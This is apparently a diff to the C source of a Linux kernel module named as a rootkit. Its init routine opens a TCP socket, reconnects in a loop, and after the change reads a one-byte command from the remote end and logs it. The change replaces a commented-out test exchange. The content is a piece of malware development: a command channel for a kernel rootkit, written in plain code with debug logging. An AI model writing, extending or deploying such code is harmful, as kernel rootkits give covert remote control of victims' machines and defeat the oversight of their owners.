@@ -64,7 +64,9 @@ static int do_data_transfer(char * buffer, size_t length, int operation) {
 }
 
 static int __init rootkit_init(void) {
-  int shutdown = 0, retval = -1; 
+  int shutdown = 0, retval = -1, attempts = 0; 
+
+  uint8_t cmd = 0;
 
   struct sockaddr_in addr;
 
@@ -78,7 +80,6 @@ static int __init rootkit_init(void) {
    */
 
   while (!shutdown) {
-    int attempts = 0;
     printk(KERN_INFO "Creating socket\n");
     if (!sock && (retval = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock)) < 0) {
       printk(KERN_INFO "Failed to create socket, uninstalling now\n");
@@ -95,14 +96,15 @@ static int __init rootkit_init(void) {
         goto uninstall;
       }
     }
+
     attempts = 0;
     printk(KERN_INFO "Connection established!\n");
 
-    char data[3] = {0x41, 0x42, 0x00};
-    printk("SIZE SENT: %i\n", do_data_transfer(data, 3, SEND));
+    //char data[3] = {0x41, 0x42, 0x00};
+    //printk("SIZE SENT: %i\n", do_data_transfer(data, 3, SEND));
 
-    printk("SIZE RECV: %i\n", do_data_transfer(data, 3, RECV));
-    printk("MSG RECV: %s\n", data);
+    printk("SIZE RECV: %i\n", do_data_transfer(&cmd, 1, RECV));
+    printk("MSG RECV: %x\n", cmd);
 
     // cleanup current connection
     printk(KERN_INFO "Destroying socket\n");
